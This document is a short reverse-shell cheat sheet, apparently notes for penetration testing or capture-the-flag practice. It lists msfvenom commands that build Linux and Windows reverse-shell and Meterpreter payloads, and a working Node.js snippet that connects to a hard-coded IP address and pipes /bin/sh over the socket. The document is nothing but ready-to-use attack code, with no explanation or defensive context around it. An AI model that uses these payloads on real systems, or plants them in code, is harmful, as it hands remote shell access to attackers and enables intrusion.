## MSFvenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o revshell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o revshell.exe
```
other msfvenom: https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1

## NodeJS
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "10.10.14.139", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
